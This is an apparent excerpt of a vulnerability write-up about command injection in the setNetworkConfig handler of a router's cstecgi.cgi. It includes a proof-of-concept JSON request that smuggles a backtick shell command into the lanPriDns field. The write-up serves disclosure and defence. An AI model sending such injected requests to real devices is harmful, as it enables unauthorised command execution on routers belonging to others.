...
The vulnerability is located in the function `sub_4106D4` within `cstecgi.cgi`, also known as `setNetworkConfig`.

![](Pasted%20image%2020231130174331.png)
...
therefore , by controlling parameter among  `proto,lanPriDns,lanIp...`(more in this function) , we can finally make an arbitrary command execution
...
{"lanPriDns":"`id > /1.txt;`","topicurl":"setNetworkConfig","token":"00000000000000000000000000000000"}
~~~
...
![](Pasted%20image%2020231130174457.png)